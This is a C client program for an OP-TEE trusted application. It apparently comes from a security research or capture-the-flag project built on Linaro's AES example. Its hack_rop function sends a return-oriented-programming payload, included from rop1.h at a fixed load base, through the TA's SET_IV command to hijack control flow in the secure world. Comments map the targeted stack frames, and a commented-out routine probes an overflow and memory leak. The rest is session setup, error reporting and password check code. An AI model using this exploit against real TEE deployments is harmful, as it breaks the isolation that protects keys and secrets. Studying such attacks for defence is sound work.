/*
 * Copyright (c) 2017, Linaro Limited
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/queue.h>

/* OP-TEE TEE client API (built by optee_client) */

#include <tee_client_api.h>
/* For the UUID (found in the TA's h-file(s)) */
#include <aes_ta.h>

#define AES_TEST_BUFFER_SIZE 4096
#define AES_TEST_KEY_SIZE 16
#define AES_BLOCK_SIZE 16

#define BUFFER_SIZE 64
#define LEAK_BUFFER_SIZE 256

#define DECODE 0
#define ENCODE 1

/* lib/libutee/include/elf_common.h */
#define PF_X 0x1 /* Executable. */

/* lib/libutee/include/tee_api_types.h */
typedef struct {
  uint32_t timeLow;
  uint16_t timeMid;
  uint16_t timeHiAndVersion;
  uint8_t clockSeqAndNode[8];
} TEE_UUID;

/* Borrowed from optee_os/includes/types_ext.h */
typedef uintptr_t vaddr_t;

/* Borrowed from optee_os/ldelf/ta_elf.h */
struct segment {
  size_t offset;
  size_t vaddr;
  size_t filesz;
  size_t memsz;
  size_t flags;
  size_t align;
  bool remapped_writeable;
  TAILQ_ENTRY(segment) link;
};

TAILQ_HEAD(segment_head, segment);
struct ta_elf {
  bool is_main;
  bool is_32bit;
  vaddr_t load_addr;
  bool is_legacy;
  vaddr_t max_addr;
  vaddr_t max_offs;
  vaddr_t ehdr_addr;
  vaddr_t e_entry;
  vaddr_t e_phoff;
  vaddr_t e_shoff;
  unsigned int e_phnum;
  unsigned int e_shnum;
  unsigned int e_phentsize;
  unsigned int e_shentsize;
  void *phdr;
  void *shdr;
  void *dynsymtab;
  size_t num_dynsyms;
  const char *dynstr;
  size_t dynstr_size;
  void *hashtab;
  struct segment_head segs;
  vaddr_t exidx_start;
  size_t exidx_size;
  uint32_t handle;
  struct ta_head *head;
  TEE_UUID uuid;
  TAILQ_ENTRY(ta_elf) link;
};

/* TEE resources */
struct test_ctx {
  TEEC_Context ctx;
  TEEC_Session sess;

  char key[AES_TEST_KEY_SIZE];
};

static inline uint64_t reg_pair_to_64(uint32_t reg0, uint32_t reg1) {
  return (uint64_t)reg0 << 32 | reg1;
}

static inline void reg_pair_from_64(uint64_t val, uint32_t *reg0,
                                    uint32_t *reg1) {
  *reg0 = val >> 32;
  *reg1 = val;
}

static void report_return(char const *fct, uint32_t returnCode,
                          uint32_t origin) {
  char *originText = "";
  char *returnCodeText = "";
  switch (origin) {
  // 1--4
  case TEEC_ORIGIN_API:
    originText = "TEEC_ORIGIN_API";
    break;
  case TEEC_ORIGIN_COMMS:
    originText = "TEEC_ORIGIN_COMMS";
    break;
  case TEEC_ORIGIN_TEE:
    originText = "TEEC_ORIGIN_TEE";
    break;
  case TEEC_ORIGIN_TRUSTED_APP:
    originText = "TEEC_ORIGIN_TRUSTED_APP";
    break;
  // >4
  default:
    originText = "reserved for future use";
    break;
  }
  switch (returnCode) {
  // TEE_SUCCESS, TEEC_SUCCESS @ 0x00000000
  case 0x00000000:
    returnCodeText = "SUCCESS";
    break;
  // Client API defined Errors TEEC_* @ 0xFFFF00..
  case TEEC_ERROR_GENERIC:
    returnCodeText = "TEEC_ERROR_GENERIC";
    break;
  case TEEC_ERROR_ACCESS_DENIED:
    returnCodeText = "TEEC_ERROR_ACCESS_DENIED";
    break;
  case TEEC_ERROR_CANCEL:
    returnCodeText = "TEEC_ERROR_CANCEL";
    break;
  case TEEC_ERROR_ACCESS_CONFLICT:
    returnCodeText = "TEEC_ERROR_ACCESS_CONFLICT";
    break;
  case TEEC_ERROR_EXCESS_DATA:
    returnCodeText = "TEEC_ERROR_EXCESS_DATA";
    break;
  case TEEC_ERROR_BAD_FORMAT:
    returnCodeText = "TEEC_ERROR_BAD_FORMAT";
    break;
  case TEEC_ERROR_BAD_PARAMETERS:
    returnCodeText = "TEEC_ERROR_BAD_PARAMETERS";
    break;
  case TEEC_ERROR_BAD_STATE:
    returnCodeText = "TEEC_ERROR_BAD_STATE";
    break;
  case TEEC_ERROR_ITEM_NOT_FOUND:
    returnCodeText = "TEEC_ERROR_ITEM_NOT_FOUND";
    break;
  case TEEC_ERROR_NOT_IMPLEMENTED:
    returnCodeText = "TEEC_ERROR_NOT_IMPLEMENTED";
    break;
  case TEEC_ERROR_NOT_SUPPORTED:
    returnCodeText = "TEEC_ERROR_NOT_SUPPORTED";
    break;
  case TEEC_ERROR_NO_DATA:
    returnCodeText = "TEEC_ERROR_NO_DATA";
    break;
  case TEEC_ERROR_OUT_OF_MEMORY:
    returnCodeText = "TEEC_ERROR_OUT_OF_MEMORY";
    break;
  case TEEC_ERROR_BUSY:
    returnCodeText = "TEEC_ERROR_BUSY";
    break;
  case TEEC_ERROR_COMMUNICATION:
    returnCodeText = "TEEC_ERROR_COMMUNICATION";
    break;
  case TEEC_ERROR_SECURITY:
    returnCodeText = "TEEC_ERROR_SECURITY";
    break;
  case TEEC_ERROR_SHORT_BUFFER:
    returnCodeText = "TEEC_ERROR_SHORT_BUFFER";
    break;
  // *NON* Client API defined Errors TEEC_* @ 0xFFFF00..
  case TEE_ERROR_EXTERNAL_CANCEL:
    returnCodeText = "TEE_ERROR_EXTERNAL_CANCEL";
    break;
  // *NON* Client API defined Errors TEEC_* @ 0xFFFF30..
  case TEE_ERROR_OVERFLOW:
    returnCodeText = "TEE_ERROR_OVERFLOW";
    break;
  case TEE_ERROR_TARGET_DEAD:
    returnCodeText = "TEE_ERROR_TARGET_DEAD";
    break;
  case TEE_ERROR_STORAGE_NO_SPACE:
    returnCodeText = "TEE_ERROR_STORAGE_NO_SPACE";
    break;
  case TEE_ERROR_MAC_INVALID:
    returnCodeText = "TEE_ERROR_MAC_INVALID";
    break;
  case TEE_ERROR_SIGNATURE_INVALID:
    returnCodeText = "TEE_ERROR_SIGNATURE_INVALID";
    break;
  // *NON* Client API defined Errors TEEC_* @ 0xFFFF50..
  case TEE_ERROR_TIME_NOT_SET:
    returnCodeText = "TEE_ERROR_TIME_NOT_SET";
    break;
  case TEE_ERROR_TIME_NEEDS_RESET:
    returnCodeText = "TEE_ERROR_TIME_NEEDS_RESET";
    break;

  // TEE @
  default:
    returnCodeText =
        origin == TEEC_ORIGIN_TRUSTED_APP ? "TA-defined"
        : returnCode < 0x70000000 ? "reserved for GlobalPlatform non-error"
        : returnCode < 0x80000000
            ? "reserved for implementation-defined non-error"
        : returnCode < 0xF0000000 ? "reserved for GlobalPlatform future use"
        : returnCode < 0xFFFF0000
            ? "reserved for GlobalPlatform TEE API"
            : "reserved for GlobalPlatform TEE Client API";
    break;
  }
  printf("%s failed with origin and return code:\n", fct);
  printf("%8x (%s): %8x (%s)\n", origin, originText, returnCode,
         returnCodeText);
}

/* Helper to initialize the context and open a session */
void prepare_tee_session(TEEC_Context *ctx, TEEC_Session *sess) {
  TEEC_UUID uuid = TA_AES_UUID;
  uint32_t origin;
  TEEC_Result res;

  /* Initialize a context connecting us to the TEE */
  res = TEEC_InitializeContext(NULL, ctx);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

  /* Open a session with the TA */
  res = TEEC_OpenSession(ctx, sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL,
                         &origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res, origin);
}

void terminate_tee_session(struct test_ctx *ctx) {
  TEEC_CloseSession(&ctx->sess);
  TEEC_FinalizeContext(&ctx->ctx);
}

void prepare_aes(struct test_ctx *ctx, int encode) {
  TEEC_Operation op;
  uint32_t origin;
  TEEC_Result res;

  memset(&op, 0, sizeof(op));
  op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_VALUE_INPUT,
                                   TEEC_VALUE_INPUT, TEEC_NONE);

  op.params[0].value.a = TA_AES_ALGO_CTR;
  op.params[1].value.a = TA_AES_SIZE_128BIT;
  op.params[2].value.a = encode ? TA_AES_MODE_ENCODE : TA_AES_MODE_DECODE;

  res = TEEC_InvokeCommand(&ctx->sess, TA_AES_CMD_PREPARE, &op, &origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InvokeCommand(PREPARE) failed 0x%x origin 0x%x", res, origin);
}

void set_key(struct test_ctx *ctx, char *key, size_t key_sz) {
  TEEC_Operation op;
  uint32_t origin;
  TEEC_Result res;

  memset(&op, 0, sizeof(op));
  op.paramTypes =
      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);

  op.params[0].tmpref.buffer = key;
  op.params[0].tmpref.size = key_sz;

  res = TEEC_InvokeCommand(&ctx->sess, TA_AES_CMD_SET_KEY, &op, &origin);
  if (res != TEEC_SUCCESS)
    errx(1, "TEEC_InvokeCommand(SET_KEY) failed 0x%x origin 0x%x", res, origin);
}

static void hack_rop(void) {
  TEEC_Result res;
  TEEC_Context ctx;
  TEEC_Session sess;
  TEEC_Operation op;

  uint32_t err_origin;

  // printf("%s %d\n", __FILE__, __LINE__);

  prepare_tee_session(&ctx, &sess);

  memset(&op, 0, sizeof(op));

  // printf("%s %d\n", __FILE__, __LINE__);

  // buffer a contains the rop codes
  // fib0((x0, ..., x(N-1)),()) = (x0, ..., x(N-1))
  // fib1((x0, ..., x(N-1)),()) = fib0((x0, ..., x(N-1)+1), (x0, ..., x(N-1))) =
  // (x0, ..., x(N-1)+1)

  // ==== STACK ====
  // # fib2(a2,a3)
  //      a1 Buffer, written with a2+a3
  // ^    x29, x30
  // ^    ...
  // # fib1(a1,a2)
  // ^--- a0 Buffer, written with a1+a2 = a2+a2+a3
  //      x29, x30
  //      ...
  // # fib0(a0,a1)
  //      Buffer, unwritten.
  //      x29, x30
  //      variables?
  // # strdup(a0)
  //      ...

  // buffer a is empty to leave b unchanged.
  char buffer_a[] = "";
  // char*, we want to have pointers here.
  size_t load_base =
      0x40015000; // 0x80015000; // 0x80091000; /* no +LMA of 0x20... */
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wint-conversion"
  char *buffer_b[] = {
#include "rop1.h"
  };
#pragma GCC diagnostic pop
  for (size_t i = sizeof(buffer_b) / sizeof(*buffer_b); i != 0; i--) {
    printf("%zu: %p\n", i, buffer_b[i]);
  }
  strcpy(buffer_a, "");

  op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                   TEEC_MEMREF_TEMP_INPUT, TEEC_VALUE_INPUT);

  // printf("%s %d\n", __FILE__, __LINE__);

  op.params[0].tmpref.buffer = ((char *)buffer_a);
  op.params[0].tmpref.size = sizeof(buffer_a);
  // 0, not sizeof! sizeof("")==1 due to minimum lengths
  reg_pair_from_64(0, &op.params[1].value.a, &op.params[1].value.b);
  op.params[2].tmpref.buffer =
      ((char *)buffer_b); // somehow there is an off by one error?
  op.params[2].tmpref.size = sizeof(buffer_b);
  reg_pair_from_64(2, &op.params[1].value.a, &op.params[3].value.b);

  printf("Invoking TA for %s, %s\n", "empty buffer", "rop buffer");
  res = TEEC_InvokeCommand(&sess, TA_AES_CMD_SET_IV, &op, &err_origin);
  report_return("TEEC_InvokeCommand", res, err_origin);
  if (res != TEEC_SUCCESS)
    goto fin;

fin:
  TEEC_CloseSession(&sess);
  TEEC_FinalizeContext(&ctx);
}

/*
static void invoke() {
  TEEC_Result res;
  TEEC_Context ctx;
  TEEC_Session sess;
  TEEC_Operation op;
  uint32_t err_origin;

  prepare_tee_session(&ctx, &sess);

  memset(&op, 0, sizeof(op));
  char sessname[] = "MY BENEVOLENT TEST SESSION";
  op.paramTypes =
      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
  op.params[0].tmpref.buffer = sessname;
  op.params[0].tmpref.size = sizeof(sessname);
  printf("Invoking TA for strdup session name, size %zu\n", sizeof(sessname));
  res = TEEC_InvokeCommand(&sess, TA_AES_CMD_SET_KEY, &op, &err_origin);
  report_return("TEEC_InvokeCommand", res, err_origin);
  if (res != TEEC_SUCCESS)
    goto fin;

  memset(&op, 0, sizeof(op));

  char buffer_a[512];
  char buffer_b[512];
  strcpy(buffer_a, "a");
  strcpy(buffer_b, "42");

  op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                   TEEC_MEMREF_TEMP_INPUT, TEEC_VALUE_INPUT);
  op.params[0].tmpref.buffer = buffer_a;
  op.params[0].tmpref.size = sizeof(buffer_a);
  reg_pair_from_64(strlen(buffer_a), &op.params[1].value.a,
                   &op.params[1].value.b);
  op.params[2].tmpref.buffer = buffer_b;
  op.params[2].tmpref.size = strlen(buffer_b);
  reg_pair_from_64(6, &op.params[1].value.a, &op.params[3].value.b);

  printf("Invoking TA for %s, %s\n", (char *)op.params[0].tmpref.buffer,
         (char *)op.params[2].tmpref.buffer);
  res = TEEC_InvokeCommand(&sess, TA_AES_CMD_SET_IV, &op, &err_origin);
  // report_return("TEEC_InvokeCommand", res, err_origin);
  if (res != TEEC_SUCCESS)
    goto fin;

  printf("Length: %zu\n",
         reg_pair_to_64(op.params[1].value.a, op.params[1].value.b));
  printf("Strlen: %zu\n", strlen(op.params[0].tmpref.buffer));
  printf("Size: %zu\n", op.params[0].tmpref.size);
  printf("Pointer: %p\n", op.params[0].tmpref.buffer);
  printf("Contents: %s\n", (char *)op.params[0].tmpref.buffer);
fin:
  TEEC_CloseSession(&sess);
  TEEC_FinalizeContext(&ctx);
}
*/

static void remember(char *pwd, size_t pwd_len) {
  TEEC_Result res;
  TEEC_Context ctx;
  TEEC_Session sess;
  TEEC_Operation op;
  uint32_t err_origin;

  prepare_tee_session(&ctx, &sess);

  memset(&op, 0, sizeof(op));
  char *contents = pwd;
  op.paramTypes =
      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
  op.params[0].tmpref.buffer = contents;
  op.params[0].tmpref.size = sizeof(contents); // includes NULbyte
  res = TEEC_InvokeCommand(&sess, TA_AES_CMD_PREPARE, &op, &err_origin);
  printf("Invoking TA for remember, size %zu\n", sizeof(contents));
  if (res != TEEC_SUCCESS)
    goto fin;

fin:
  TEEC_CloseSession(&sess);
  TEEC_FinalizeContext(&ctx);
}

static void check(char *pwd, size_t pwd_len) {
  TEEC_Result res;
  TEEC_Context ctx;
  TEEC_Session sess;
  TEEC_Operation op;
  uint32_t err_origin;

  prepare_tee_session(&ctx, &sess);

  memset(&op, 0, sizeof(op));
  char *correct = pwd;
  char wrong[] = "SOMETHING TO FORGET!!";
  op.paramTypes =
      TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);

  op.params[0].tmpref.buffer = correct;
  op.params[0].tmpref.size = sizeof(correct); // includes NULbyte
  printf("Invoking TA for TA_AES_CMD_CHECK1, size %zu\n", sizeof(correct));
  res = TEEC_InvokeCommand(&sess, TA_AES_CMD_CHECK1, &op, &err_origin);
  report_return("TEEC_InvokeCommand", res, err_origin);

  // op.params[0].tmpref.buffer = correct;
  // op.params[0].tmpref.size = sizeof(correct); // includes NULbyte
  // printf("Invoking TA for TA_AES_CMD_CHECK2, size %zu\n", sizeof(correct));
  // res = TEEC_InvokeCommand(&sess, TA_AES_CMD_CHECK2, &op, &err_origin);
  // report_return("TEEC_InvokeCommand", res, err_origin);

  op.params[0].tmpref.buffer = wrong;
  op.params[0].tmpref.size = sizeof(wrong); // includes NULbyte
  printf("Invoking TA for TA_AES_CMD_CHECK1, size %zu\n", sizeof(wrong));
  res = TEEC_InvokeCommand(&sess, TA_AES_CMD_CHECK1, &op, &err_origin);
  report_return("TEEC_InvokeCommand", res, err_origin);

  // op.params[0].tmpref.buffer = wrong;
  // op.params[0].tmpref.size = sizeof(wrong); // includes NULbyte
  // printf("Invoking TA for TA_AES_CMD_CHECK2, size %zu\n", sizeof(wrong));
  // res = TEEC_InvokeCommand(&sess, TA_AES_CMD_CHECK2, &op, &err_origin);
  // report_return("TEEC_InvokeCommand", res, err_origin);

  TEEC_CloseSession(&sess);
  TEEC_FinalizeContext(&ctx);
}

static void usage(int argc, char *argv[]) {
  const char *pname = "acipher";

  if (argc)
    pname = argv[0];

  fprintf(stderr, "usage: %s <key_size> <string to encrypt>\n", pname);
  exit(1);
}

static void get_args(int argc, char *argv[], void **_cmd, size_t *cmd_len) {
  char *ep;
  long ks;

  if (argc != 2) {
    warnx("Unexpected number of arguments %d (expected 2)", argc - 1);
    usage(argc, argv);
  }

  *_cmd = argv[1];
  *cmd_len = strlen(argv[1]);
}

static void setpwd(void) {
  char pwd[16];

  printf("Enter a pwd: ");
  if (fgets(pwd, sizeof(pwd), stdin)) {
    pwd[strcspn(pwd, "\n")] = '\0';
    remember(pwd, strlen(pwd));
  }
}

static void get(void) {
  char pwd[16];

  printf("Enter the pwd: ");
  if (fgets(pwd, sizeof(pwd), stdin)) {
    pwd[strcspn(pwd, "\n")] = '\0';
    check(pwd, strlen(pwd));
  }
}

int main(int argc, char *argv[]) {
  void *_cmd;
  char *cmd;
  size_t cmd_size;

  get_args(argc, argv, &_cmd, &cmd_size);
  cmd = (char *)_cmd;

  if (strcmp(cmd, "setpw") == 0) {
    printf("setpw\n");
    printf("remember(): %s %d\n", __FILE__, __LINE__);
    setpwd();
  } else if (strcmp(cmd, "get") == 0) {
    printf("check(): %s %d\n", __FILE__, __LINE__);
    get();
  } else if (strcmp(cmd, "vuln") == 0) {
    printf("vuln\n");
    printf("remember(): %s %d\n", __FILE__, __LINE__);

    // printf("invoke(): %s %d\n", __FILE__, __LINE__);
    // invoke();

    printf("hack_rop1(): %s %d\n", __FILE__, __LINE__);
    hack_rop();

    printf("check(): %s %d\n", __FILE__, __LINE__);
  }

  return 0;
}
